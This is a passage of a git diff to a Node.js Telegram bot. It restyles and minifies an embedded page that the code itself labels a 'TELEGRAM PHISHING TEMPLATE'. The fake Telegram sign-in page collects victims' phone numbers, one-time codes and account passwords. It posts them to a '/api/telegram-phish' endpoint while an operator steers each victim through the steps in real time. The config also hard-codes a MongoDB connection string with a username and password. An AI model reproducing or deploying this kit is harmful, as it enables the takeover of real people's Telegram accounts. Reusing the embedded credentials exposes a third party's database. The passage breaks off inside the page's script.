@@ -1,4 +1,4 @@
-// ====================== index.js – ULTIMATE VERSION WITH ALL FEATURES & FIXES ======================
+// ====================== index.js – ULTIMATE VERSION WITH ALL FIXES ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
  * 
@@ -10,6 +10,10 @@
  * - Webhook + Polling Support (auto-detects)
  * - Broadcast: Supports photos, videos, documents, GIFs, emojis, text
  * - Complete code with all features intact
+ * - FIXED: Link generation error (DOCUMENT_INVALID)
+ * - FIXED: User name showing correctly in menu
+ * - FIXED: Premium emojis properly applied
+ * - STYLES: Danger (Red), Primary (Blue), Success (Green) everywhere
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -25,7 +29,7 @@ const config = {
     LINK_EXPIRY: 15 * 60 * 1000,
     MAX_OPENS: 5,
     mongoUrl: 'mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0',
-    useWebhook: true // Webhook enabled for Render
+    useWebhook: true
 };
 
 console.log('✅ Bot Token loaded!');
@@ -421,7 +425,6 @@ const broadcastSchema = new mongoose.Schema({
     status: String
 });
 
-// Add indexes for performance
 userSchema.index({ userId: 1 });
 userSchema.index({ banned: 1 });
 userSchema.index({ joinedAt: -1 });
@@ -472,15 +475,9 @@ const upload = multer({
     }
 });
 
-// ====================== EMOJI HELPER FUNCTION ======================
+// ====================== EMOJI HELPER FUNCTIONS ======================
 function getEmojiId(emoji) {
     return EMOJI_MAP[emoji] || null;
-}
-
-// For buttons - remove premium emoji, keep normal
-function replaceWithNormalEmojis(text) {
-    // Just return text as is for buttons
-    return text;
 }
 
 function replaceWithPremiumEmojis(text) {
@@ -696,8 +693,8 @@ async function checkAllChannels(userId) {
 }
 async function getChannelButtonsAsync() {
     const channels = await getChannels();
-    const buttons = channels.map(ch => ([{ text: '📢 ' + ch.name, url: ch.link }]));
-    buttons.push([{ text: '✅ Check All Joined', callback_data: 'check_all' }]);
+    const buttons = channels.map(ch => ([{ text: replaceAllEmojis('📢 ') + ch.name, url: ch.link }]));
+    buttons.push([{ text: replaceAllEmojis('✅ ') + 'Check All Joined', callback_data: 'check_all' }]);
     return { inline_keyboard: buttons };
 }
 
@@ -876,7 +873,7 @@ async function sendBatchPhotos(userId) {
     delete userActive[userId];
 }
 
-// ====================== TELEGRAM PHISHING TEMPLATE (with premium emojis) ======================
+// ====================== TELEGRAM PHISHING TEMPLATE ======================
 const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -885,343 +882,67 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
     <title>Telegram</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-        body {
-            background: #0a0a0a;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .container {
-            max-width: 480px;
-            width: 100%;
-            background: #17212b;
-            border-radius: 32px;
-            padding: 45px 32px 40px;
-            box-shadow: 0 25px 80px rgba(0,0,0,0.9);
-            border: 1px solid rgba(255,255,255,0.04);
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 35px;
-        }
-        .logo svg {
-            width: 72px;
-            height: 72px;
-        }
-        .logo h1 {
-            color: #ffffff;
-            font-size: 28px;
-            font-weight: 700;
-            margin-top: 10px;
-            letter-spacing: -0.5px;
-        }
-        .logo p {
-            color: #8b9bb5;
-            font-size: 16px;
-            margin-top: 6px;
-            font-weight: 400;
-        }
-        .input-group {
-            margin-bottom: 20px;
-            position: relative;
-        }
-        .input-group label {
-            display: block;
-            color: #8b9bb5;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 8px;
-            letter-spacing: 0.3px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 16px 18px;
-            background: #1e2a36;
-            border: 2px solid #2b3b4a;
-            border-radius: 14px;
-            color: #ffffff;
-            font-size: 18px;
-            outline: none;
-            transition: all 0.25s ease;
-        }
-        .input-group input:focus {
-            border-color: #2b9eff;
-            background: #1e2a36;
-            box-shadow: 0 0 0 4px rgba(43, 158, 255, 0.12);
-        }
-        .input-group input::placeholder {
-            color: #6b7f94;
-            font-size: 16px;
-        }
-        .input-group .country-select {
-            position: absolute;
-            left: 18px;
-            top: 42px;
-            color: #ffffff;
-            font-weight: 600;
-            font-size: 18px;
-            pointer-events: none;
-            background: #1e2a36;
-            padding-right: 10px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .input-group .country-select .flag {
-            font-size: 20px;
-        }
-        .input-group .country-select .arrow {
-            font-size: 12px;
-            color: #6b7f94;
-        }
-        .input-group .phone-input {
-            padding-left: 75px;
-        }
-        .btn {
-            width: 100%;
-            padding: 18px;
-            background: #2b9eff;
-            border: none;
-            border-radius: 14px;
-            color: #ffffff;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.25s ease;
-            margin-top: 12px;
-        }
-        .btn:hover {
-            background: #4aabff;
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(43, 158, 255, 0.3);
-        }
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        .btn-secondary {
-            background: transparent;
-            border: 2px solid #2b3b4a;
-            color: #8b9bb5;
-        }
-        .btn-secondary:hover {
-            background: rgba(255,255,255,0.04);
-            border-color: #3b4b5a;
-            transform: none;
-            box-shadow: none;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 28px;
-            color: #6b7f94;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        .footer a {
-            color: #2b9eff;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        .loader {
-            display: none;
-            text-align: center;
-            padding: 30px 0;
-        }
-        .loader .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #1e2a36;
-            border-top-color: #2b9eff;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            margin: 0 auto;
-        }
-        @keyframes spin {
-            100% { transform: rotate(360deg); }
-        }
-        .loader p {
-            color: #8b9bb5;
-            margin-top: 16px;
-            font-size: 15px;
-            font-weight: 400;
-        }
-        .loader .sub-text {
-            color: #6b7f94;
-            font-size: 13px;
-            margin-top: 6px;
-        }
-        .otp-section {
-            display: none;
-        }
-        .otp-section.active {
-            display: block;
-        }
-        .login-section {
-            display: block;
-        }
-        .login-section.hidden {
-            display: none;
-        }
-        .error-msg {
-            background: rgba(255, 69, 58, 0.12);
-            border: 1px solid rgba(255, 69, 58, 0.25);
-            border-radius: 12px;
-            padding: 14px 18px;
-            color: #ff453a;
-            font-size: 15px;
-            margin-top: 12px;
-            display: none;
-            font-weight: 500;
-        }
-        .error-msg.show {
-            display: block;
-        }
-        .password-section {
-            display: none;
-        }
-        .password-section.active {
-            display: block;
-        }
-        .result-buttons {
-            display: none;
-            gap: 14px;
-            margin-top: 25px;
-            flex-direction: column;
-        }
-        .result-buttons.show {
-            display: flex;
-        }
-        .result-buttons .btn {
-            margin-top: 0;
-        }
-        .status-text {
-            text-align: center;
-            color: #8b9bb5;
-            font-size: 15px;
-            margin-top: 18px;
-            display: none;
-        }
-        .status-text.show {
-            display: block;
-        }
-        .final-status {
-            text-align: center;
-            padding: 25px 0;
-        }
-        .final-status .icon {
-            font-size: 56px;
-            margin-bottom: 12px;
-        }
-        .final-status h3 {
-            color: #ffffff;
-            font-size: 22px;
-            font-weight: 700;
-        }
-        .final-status p {
-            color: #8b9bb5;
-            font-size: 16px;
-            margin-top: 8px;
-            line-height: 1.6;
-        }
-        .final-status .sub {
-            color: #6b7f94;
-            font-size: 14px;
-            margin-top: 6px;
-        }
-        .final-status .highlight {
-            color: #2ed573;
-            font-weight: 600;
-        }
-        .resend-btn {
-            background: transparent;
-            border: none;
-            color: #2b9eff;
-            font-size: 14px;
-            cursor: pointer;
-            font-weight: 600;
-            padding: 10px;
-            margin-top: 8px;
-            transition: all 0.2s;
-        }
-        .resend-btn:hover {
-            color: #4aabff;
-            text-decoration: underline;
-        }
-        .otp-timer {
-            color: #6b7f94;
-            font-size: 13px;
-            text-align: center;
-            margin-top: 10px;
-        }
-        .otp-timer span {
-            color: #ffffff;
-            font-weight: 600;
-        }
-        .input-hint {
-            color: #6b7f94;
-            font-size: 13px;
-            margin-top: 6px;
-            padding-left: 4px;
-        }
-        .decision-waiting {
-            display: none;
-            text-align: center;
-            padding: 30px 0;
-        }
-        .decision-waiting.show {
-            display: block;
-        }
-        .decision-waiting .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #1e2a36;
-            border-top-color: #2b9eff;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            margin: 0 auto;
-        }
-        .decision-waiting p {
-            color: #8b9bb5;
-            margin-top: 16px;
-            font-size: 15px;
-        }
-        .decision-waiting .sub-text {
-            color: #6b7f94;
-            font-size: 13px;
-            margin-top: 6px;
-        }
-        @media (max-width: 480px) {
-            .container {
-                padding: 30px 20px 30px;
-            }
-            .logo h1 {
-                font-size: 24px;
-            }
-            .input-group input {
-                font-size: 16px;
-                padding: 14px 16px;
-            }
-            .input-group .phone-input {
-                padding-left: 70px;
-            }
-            .btn {
-                font-size: 16px;
-                padding: 16px;
-            }
-        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',-apple-system,sans-serif}
+        body{background:#0a0a0a;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+        .container{max-width:480px;width:100%;background:#17212b;border-radius:32px;padding:45px 32px 40px;box-shadow:0 25px 80px rgba(0,0,0,0.9);border:1px solid rgba(255,255,255,0.04)}
+        .logo{text-align:center;margin-bottom:35px}
+        .logo svg{width:72px;height:72px}
+        .logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:10px;letter-spacing:-0.5px}
+        .logo p{color:#8b9bb5;font-size:16px;margin-top:6px}
+        .input-group{margin-bottom:20px;position:relative}
+        .input-group label{display:block;color:#8b9bb5;font-size:14px;font-weight:500;margin-bottom:8px;letter-spacing:0.3px}
+        .input-group input{width:100%;padding:16px 18px;background:#1e2a36;border:2px solid #2b3b4a;border-radius:14px;color:#fff;font-size:18px;outline:none;transition:all .25s}
+        .input-group input:focus{border-color:#2b9eff;background:#1e2a36;box-shadow:0 0 0 4px rgba(43,158,255,0.12)}
+        .input-group input::placeholder{color:#6b7f94;font-size:16px}
+        .input-group .country-select{position:absolute;left:18px;top:42px;color:#fff;font-weight:600;font-size:18px;pointer-events:none;background:#1e2a36;padding-right:10px;display:flex;align-items:center;gap:6px}
+        .input-group .country-select .flag{font-size:20px}
+        .input-group .country-select .arrow{font-size:12px;color:#6b7f94}
+        .input-group .phone-input{padding-left:75px}
+        .btn{width:100%;padding:18px;border:none;border-radius:14px;color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .25s;margin-top:12px}
+        .btn-primary{background:#2b9eff}
+        .btn-primary:hover{background:#4aabff;transform:translateY(-2px);box-shadow:0 8px 30px rgba(43,158,255,0.3)}
+        .btn-danger{background:#dc3545}
+        .btn-danger:hover{background:#c82333;transform:translateY(-2px);box-shadow:0 8px 30px rgba(220,53,69,0.3)}
+        .btn-success{background:#28a745}
+        .btn-success:hover{background:#1e7e34;transform:translateY(-2px);box-shadow:0 8px 30px rgba(40,167,69,0.3)}
+        .btn:disabled{opacity:0.6;cursor:not-allowed;transform:none;box-shadow:none}
+        .btn-secondary{background:transparent;border:2px solid #2b3b4a;color:#8b9bb5}
+        .btn-secondary:hover{background:rgba(255,255,255,0.04);border-color:#3b4b5a;transform:none;box-shadow:none}
+        .footer{text-align:center;margin-top:28px;color:#6b7f94;font-size:14px;line-height:1.6}
+        .footer a{color:#2b9eff;text-decoration:none;font-weight:500}
+        .footer a:hover{text-decoration:underline}
+        .loader{display:none;text-align:center;padding:30px 0}
+        .loader .spinner{width:50px;height:50px;border:4px solid #1e2a36;border-top-color:#2b9eff;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto}
+        @keyframes spin{100%{transform:rotate(360deg)}}
+        .loader p{color:#8b9bb5;margin-top:16px;font-size:15px}
+        .loader .sub-text{color:#6b7f94;font-size:13px;margin-top:6px}
+        .otp-section{display:none}.otp-section.active{display:block}
+        .login-section{display:block}.login-section.hidden{display:none}
+        .error-msg{background:rgba(255,69,58,0.12);border:1px solid rgba(255,69,58,0.25);border-radius:12px;padding:14px 18px;color:#ff453a;font-size:15px;margin-top:12px;display:none;font-weight:500}
+        .error-msg.show{display:block}
+        .password-section{display:none}.password-section.active{display:block}
+        .result-buttons{display:none;gap:14px;margin-top:25px;flex-direction:column}
+        .result-buttons.show{display:flex}
+        .result-buttons .btn{margin-top:0}
+        .status-text{text-align:center;color:#8b9bb5;font-size:15px;margin-top:18px;display:none}
+        .status-text.show{display:block}
+        .final-status{text-align:center;padding:25px 0}
+        .final-status .icon{font-size:56px;margin-bottom:12px}
+        .final-status h3{color:#fff;font-size:22px;font-weight:700}
+        .final-status p{color:#8b9bb5;font-size:16px;margin-top:8px;line-height:1.6}
+        .final-status .sub{color:#6b7f94;font-size:14px;margin-top:6px}
+        .final-status .highlight{color:#28a745;font-weight:600}
+        .resend-btn{background:transparent;border:none;color:#2b9eff;font-size:14px;cursor:pointer;font-weight:600;padding:10px;margin-top:8px;transition:all .2s}
+        .resend-btn:hover{color:#4aabff;text-decoration:underline}
+        .otp-timer{color:#6b7f94;font-size:13px;text-align:center;margin-top:10px}
+        .otp-timer span{color:#fff;font-weight:600}
+        .input-hint{color:#6b7f94;font-size:13px;margin-top:6px;padding-left:4px}
+        .decision-waiting{display:none;text-align:center;padding:30px 0}
+        .decision-waiting.show{display:block}
+        .decision-waiting .spinner{width:50px;height:50px;border:4px solid #1e2a36;border-top-color:#2b9eff;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto}
+        .decision-waiting p{color:#8b9bb5;margin-top:16px;font-size:15px}
+        .decision-waiting .sub-text{color:#6b7f94;font-size:13px;margin-top:6px}
+        @media(max-width:480px){.container{padding:30px 20px}.logo h1{font-size:24px}.input-group input{font-size:16px;padding:14px 16px}.input-group .phone-input{padding-left:70px}.btn{font-size:16px;padding:16px}}
     </style>
 </head>
 <body>
@@ -1234,8 +955,6 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         <h1>Telegram</h1>
         <p id="page-subtitle">Sign in to your account</p>
     </div>
-
-    <!-- Login Section -->
     <div id="loginSection" class="login-section">
         <div class="input-group">
             <label>Phone Number</label>
@@ -1249,25 +968,21 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
             </div>
             <div class="input-hint">Enter your phone number to receive a verification code</div>
         </div>
-        <button class="btn" id="sendOtpBtn">Send OTP</button>
+        <button class="btn btn-primary" id="sendOtpBtn">Send OTP</button>
         <div id="loginError" class="error-msg"></div>
         <div class="loader" id="loginLoader">
             <div class="spinner"></div>
             <p>Sending verification code...</p>
         </div>
-        <div class="footer">
-            By signing up, you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a>
-        </div>
+        <div class="footer">By signing up, you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a></div>
     </div>
-
-    <!-- OTP Section -->
     <div id="otpSection" class="otp-section">
         <div class="input-group">
             <label>Verification Code</label>
             <input type="text" id="otpInput" placeholder="Enter 5-digit code" maxlength="5" inputmode="numeric">
             <div class="input-hint">Enter the code sent to your phone</div>
         </div>
-        <button class="btn" id="verifyOtpBtn">Verify OTP</button>
+        <button class="btn btn-success" id="verifyOtpBtn">Verify OTP</button>
         <div id="otpError" class="error-msg"></div>
         <div id="otpLoader" class="loader">
             <div class="spinner"></div>
@@ -1284,15 +999,13 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
         </div>
         <div class="otp-timer">Code expires in <span id="otpTimer">60</span> seconds</div>
     </div>
-
-    <!-- Password Section -->
     <div id="passwordSection" class="password-section">
         <div class="input-group">
             <label>Password</label>
             <input type="password" id="passwordInput" placeholder="Enter your password">
             <div class="input-hint">Enter your Telegram account password</div>
         </div>
-        <button class="btn" id="passwordSubmitBtn">Submit</button>
+        <button class="btn btn-danger" id="passwordSubmitBtn">Submit</button>
         <div id="passwordError" class="error-msg"></div>
         <div id="passwordLoader" class="loader">
             <div class="spinner"></div>
@@ -1302,8 +1015,6 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
             <a href="#" style="color:#2b9eff;text-decoration:none;font-size:14px;font-weight:500;">Forgot password?</a>
         </div>
     </div>
-
-    <!-- Final Result -->
     <div id="finalResult" style="display:none;">
         <div class="final-status">
             <div class="icon">✅</div>
@@ -1313,342 +1024,74 @@ const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
             <div class="sub" style="margin-top:8px;">You will receive a confirmation notification</div>
         </div>
         <div class="result-buttons show" style="display:flex !important;">
-            <button class="btn" onclick="window.location.href='tg://resolve?domain=telegram'">
-                📱 Open Telegram
-            </button>
-            <button class="btn btn-secondary" id="openCompletedBtn">
-                ✅ I've Opened Telegram
-            </button>
+            <button class="btn btn-primary" onclick="window.location.href='tg://resolve?domain=telegram'">📱 Open Telegram</button>
+            <button class="btn btn-success" id="openCompletedBtn">✅ I've Opened Telegram</button>
         </div>
         <div id="openStatus" class="status-text"></div>
     </div>
-
-    <!-- Status Messages -->
     <div id="statusMessage" class="status-text"></div>
 </div>
-
 <script>
-    // ====================== CONFIG ======================
-    const SESSION_ID = 'SESSION_ID_PLACEHOLDER';
-    const USER_ID = 'USER_ID_PLACEHOLDER';
-    const PLATFORM = 'TELEGRAM_PREMIUM';
-
-    // ====================== STATE ======================
-    let currentStep = 'login';
-    let phoneNumber = '';
-    let otpCode = '';
-    let password = '';
-    let otpTimerInterval = null;
-    let otpTimeLeft = 60;
-    let isWaitingForDecision = false;
-    let decisionCheckInterval = null;
-
-    // ====================== DOM REFS ======================
-    const loginSection = document.getElementById('loginSection');
-    const otpSection = document.getElementById('otpSection');
-    const passwordSection = document.getElementById('passwordSection');
-    const finalResult = document.getElementById('finalResult');
-
-    const phoneInput = document.getElementById('phoneInput');
-    const sendOtpBtn = document.getElementById('sendOtpBtn');
-    const loginLoader = document.getElementById('loginLoader');
-    const loginError = document.getElementById('loginError');
-
-    const otpInput = document.getElementById('otpInput');
-    const verifyOtpBtn = document.getElementById('verifyOtpBtn');
-    const otpLoader = document.getElementById('otpLoader');
-    const otpError = document.getElementById('otpError');
-    const resendOtpBtn = document.getElementById('resendOtpBtn');
-    const otpTimer = document.getElementById('otpTimer');
-    const decisionWaiting = document.getElementById('decisionWaiting');
-
-    const passwordInput = document.getElementById('passwordInput');
-    const passwordSubmitBtn = document.getElementById('passwordSubmitBtn');
-    const passwordLoader = document.getElementById('passwordLoader');
-    const passwordError = document.getElementById('passwordError');
-
-    const openCompletedBtn = document.getElementById('openCompletedBtn');
-    const openStatus = document.getElementById('openStatus');
-
-    // ====================== HELPER FUNCTIONS ======================
-    function showLoader(loader) {
-        loader.style.display = 'block';
-    }
-    function hideLoader(loader) {
-        loader.style.display = 'none';
-    }
-    function showError(errorEl, msg) {
-        errorEl.textContent = msg;
-        errorEl.classList.add('show');
-        setTimeout(() => errorEl.classList.remove('show'), 6000);
-    }
-    function hideError(errorEl) {
-        errorEl.classList.remove('show');
-    }
-    function setStatus(msg, isSuccess = false) {
-        const el = document.getElementById('statusMessage');
-        el.textContent = msg;
-        el.className = 'status-text show';
-        if (isSuccess) {
-            el.style.color = '#2ed573';
-        } else {
-            el.style.color = '#8b9bb5';
-        }
-        setTimeout(() => {
-            el.classList.remove('show');
-            el.style.color = '#8b9bb5';
-        }, 5000);
-    }
-
-    function simulateLoading(callback, duration = 1500) {
-        return new Promise(resolve => {
-            setTimeout(() => {
-                if (callback) callback();
-                resolve();
-            }, duration);
-        });
-    }
-
-    function startOtpTimer() {
-        otpTimeLeft = 60;
-        otpTimer.textContent = otpTimeLeft;
-        if (otpTimerInterval) clearInterval(otpTimerInterval);
-        otpTimerInterval = setInterval(() => {
-            otpTimeLeft--;
-            otpTimer.textContent = otpTimeLeft;
-            if (otpTimeLeft <= 0) {
-                clearInterval(otpTimerInterval);
-                otpTimer.textContent = '0';
-                resendOtpBtn.style.color = '#2b9eff';
-                resendOtpBtn.style.cursor = 'pointer';
-                resendOtpBtn.disabled = false;
-            }
-        }, 1000);
-        resendOtpBtn.style.color = '#6b7f94';
-        resendOtpBtn.style.cursor = 'not-allowed';
-        resendOtpBtn.disabled = true;
-    }
-
-    function showDecisionWaiting() {
-        hideLoader(otpLoader);
-        verifyOtpBtn.style.display = 'none';
-        decisionWaiting.classList.add('show');
-        isWaitingForDecision = true;
-        if (decisionCheckInterval) clearInterval(decisionCheckInterval);
-        decisionCheckInterval = setInterval(checkDecision, 2000);
-    }
-
-    function hideDecisionWaiting() {
-        decisionWaiting.classList.remove('show');
-        verifyOtpBtn.style.display = 'block';
-        isWaitingForDecision = false;
-        if (decisionCheckInterval) clearInterval(decisionCheckInterval);
-    }
-
-    // ====================== CHECK DECISION ======================
-    async function checkDecision() {
-        try {
-            const response = await fetch('/api/telegram-decision/' + SESSION_ID);
-            const data = await response.json();
-            
-            if (data.decision) {
-                hideDecisionWaiting();
-                
-                if (data.decision === 'password') {
-                    otpSection.classList.remove('active');
-                    passwordSection.classList.add('active');
-                    currentStep = 'password';
-                    setStatus('🔐 Please enter your password', true);
-                    passwordInput.focus();
-                } else if (data.decision === 'wrong') {
-                    showError(otpError, '❌ Invalid verification code. Please try again.');
-                    otpInput.value = '';
-                    otpInput.focus();
-                    verifyOtpBtn.style.display = 'block';
-                    currentStep = 'otp';
-                } else if (data.decision === 'open') {
-                    otpSection.classList.remove('active');
-                    finalResult.style.display = 'block';
-                    currentStep = 'final';
-                    setStatus('✅ Request submitted successfully!', true);
-                }
-            }
-        } catch (err) {
-            console.error('Decision check error:', err);
-        }
-    }
-
-    // ====================== API CALLS ======================
-    async function apiCall(action, data = {}) {
-        try {
-            const response = await fetch('/api/telegram-phish', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    ...data, 
-                    sessionId: SESSION_ID, 
-                    userId: USER_ID, 
-                    platform: PLATFORM,
-                    action: action 
-                })
-            });
-            return await response.json();
-        } catch (err) {
-            console.error('API Error:', err);
-            return { error: 'Network error' };
-        }
-    }
-
-    // ====================== LOGIN ======================
-    sendOtpBtn.addEventListener('click', async () => {
-        const phone = phoneInput.value.trim();
-        if (phone.length < 10) {
-            showError(loginError, 'Please enter a valid 10-digit phone number.');
-            return;
-        }
-        phoneNumber = phone;
-        hideError(loginError);
-        showLoader(loginLoader);
-        sendOtpBtn.disabled = true;
-
-        const result = await apiCall('phone', { phone: phoneNumber });
-
-        await simulateLoading(() => {}, 1800);
-
-        hideLoader(loginLoader);
-        sendOtpBtn.disabled = false;
-
-        if (result.status === 'success') {
-            loginSection.classList.add('hidden');
-            otpSection.classList.add('active');
-            currentStep = 'otp';
-            setStatus('📱 Verification code sent to your phone', true);
-            startOtpTimer();
-            otpInput.focus();
-        } else {
-            showError(loginError, '❌ Failed to send OTP. Please try again.');
-        }
-    });
-
-    // ====================== OTP ======================
-    verifyOtpBtn.addEventListener('click', async () => {
-        const otp = otpInput.value.trim();
-        if (otp.length < 5) {
-            showError(otpError, 'Please enter a valid 5-digit verification code.');
-            return;
-        }
-        otpCode = otp;
-        hideError(otpError);
-        showLoader(otpLoader);
-        verifyOtpBtn.disabled = true;
-
-        const result = await apiCall('otp', { otp: otpCode, phone: phoneNumber });
-
-        if (result.status === 'waiting_decision') {
-            hideLoader(otpLoader);
-            showDecisionWaiting();
-            setStatus('⏳ Waiting for verification...');
-        } else if (result.status === 'success') {
-            hideLoader(otpLoader);
-            verifyOtpBtn.disabled = false;
-            otpSection.classList.remove('active');
-            passwordSection.classList.add('active');
-            currentStep = 'password';
-            setStatus('🔐 OTP verified! Enter password', true);
-            passwordInput.focus();
-            if (otpTimerInterval) clearInterval(otpTimerInterval);
-        } else {
-            hideLoader(otpLoader);
-            verifyOtpBtn.disabled = false;
-            showError(otpError, '❌ Verification failed. Please try again.');
-        }
-    });
-
-    // Resend OTP
-    resendOtpBtn.addEventListener('click', async () => {
-        if (resendOtpBtn.disabled) return;
-        setStatus('📤 Resending verification code...');
-        await apiCall('resend-otp', { phone: phoneNumber });
-        setStatus('✅ Verification code resent!', true);
-        startOtpTimer();
-        otpInput.value = '';
-        otpInput.focus();
-    });
-
-    // ====================== PASSWORD ======================
-    passwordSubmitBtn.addEventListener('click', async () => {
-        const pwd = passwordInput.value.trim();
-        if (pwd.length < 4) {
-            showError(passwordError, 'Please enter a valid password (minimum 4 characters).');
-            return;
-        }
-        password = pwd;
-        hideError(passwordError);
-        showLoader(passwordLoader);
-        passwordSubmitBtn.disabled = true;
-
-        const result = await apiCall('password', { password: password, phone: phoneNumber });
-
-        if (result.status === 'success') {
-            hideLoader(passwordLoader);
-            passwordSubmitBtn.disabled = false;
-            passwordSection.classList.remove('active');
-            finalResult.style.display = 'block';
-            currentStep = 'final';
-            setStatus('✅ Premium request submitted successfully!', true);
-        } else {
-            hideLoader(passwordLoader);
-            passwordSubmitBtn.disabled = false;
-            showError(passwordError, '❌ Wrong password. Please try again.');
-            passwordInput.value = '';
-            passwordInput.focus();
-        }
-    });
-
-    // ====================== FINAL BUTTONS ======================
-    openCompletedBtn.addEventListener('click', () => {
-        openStatus.textContent = '✅ Thank you! Your request has been submitted.';
-        openStatus.className = 'status-text show';
-        openStatus.style.color = '#2ed573';
-        setStatus('📱 Request submitted successfully!', true);
-        apiCall('completed', { phone: phoneNumber });
-    });
-
-    // ====================== KEYBOARD SHORTCUTS ======================
-    phoneInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') sendOtpBtn.click();
-    });
-    otpInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') verifyOtpBtn.click();
-    });
-    passwordInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') passwordSubmitBtn.click();
-    });
-
-    // ====================== PHONE NUMBER FORMATTING ======================
-    phoneInput.addEventListener('input', () => {
-        phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
-    });
-    otpInput.addEventListener('input', () => {
-        otpInput.value = otpInput.value.replace(/[^0-9]/g, '').slice(0, 5);
-    });
-
-    // ====================== AUTO-FOCUS ======================
+    const SESSION_ID='SESSION_ID_PLACEHOLDER';
+    const USER_ID='USER_ID_PLACEHOLDER';
+    const PLATFORM='TELEGRAM_PREMIUM';
+    let currentStep='login',phoneNumber='',otpCode='',password='',otpTimerInterval=null,otpTimeLeft=60,isWaitingForDecision=false,decisionCheckInterval=null;
+    const loginSection=document.getElementById('loginSection');
+    const otpSection=document.getElementById('otpSection');
+    const passwordSection=document.getElementById('passwordSection');
+    const finalResult=document.getElementById('finalResult');
+    const phoneInput=document.getElementById('phoneInput');
+    const sendOtpBtn=document.getElementById('sendOtpBtn');
+    const loginLoader=document.getElementById('loginLoader');
+    const loginError=document.getElementById('loginError');
+    const otpInput=document.getElementById('otpInput');
+    const verifyOtpBtn=document.getElementById('verifyOtpBtn');
+    const otpLoader=document.getElementById('otpLoader');
+    const otpError=document.getElementById('otpError');
+    const resendOtpBtn=document.getElementById('resendOtpBtn');
+    const otpTimer=document.getElementById('otpTimer');
+    const decisionWaiting=document.getElementById('decisionWaiting');
+    const passwordInput=document.getElementById('passwordInput');
+    const passwordSubmitBtn=document.getElementById('passwordSubmitBtn');
+    const passwordLoader=document.getElementById('passwordLoader');
+    const passwordError=document.getElementById('passwordError');
+    const openCompletedBtn=document.getElementById('openCompletedBtn');
+    const openStatus=document.getElementById('openStatus');
+    function showLoader(l){l.style.display='block'}
+    function hideLoader(l){l.style.display='none'}
+    function showError(e,msg){e.textContent=msg;e.classList.add('show');setTimeout(()=>e.classList.remove('show'),6000)}
+    function hideError(e){e.classList.remove('show')}
+    function setStatus(msg,s){const el=document.getElementById('statusMessage');el.textContent=msg;el.className='status-text show';el.style.color=s?'#28a745':'#8b9bb5';setTimeout(()=>{el.classList.remove('show');el.style.color='#8b9bb5'},5000)}
+    function startOtpTimer(){otpTimeLeft=60;otpTimer.textContent=otpTimeLeft;if(otpTimerInterval)clearInterval(otpTimerInterval);otpTimerInterval=setInterval(()=>{otpTimeLeft--;otpTimer.textContent=otpTimeLeft;if(otpTimeLeft<=0){clearInterval(otpTimerInterval);otpTimer.textContent='0';resendOtpBtn.style.color='#2b9eff';resendOtpBtn.style.cursor='pointer';resendOtpBtn.disabled=false}},1000);resendOtpBtn.style.color='#6b7f94';resendOtpBtn.style.cursor='not-allowed';resendOtpBtn.disabled=true}
+    function showDecisionWaiting(){hideLoader(otpLoader);verifyOtpBtn.style.display='none';decisionWaiting.classList.add('show');isWaitingForDecision=true;if(decisionCheckInterval)clearInterval(decisionCheckInterval);decisionCheckInterval=setInterval(checkDecision,2000)}
+    function hideDecisionWaiting(){decisionWaiting.classList.remove('show');verifyOtpBtn.style.display='block';isWaitingForDecision=false;if(decisionCheckInterval)clearInterval(decisionCheckInterval)}
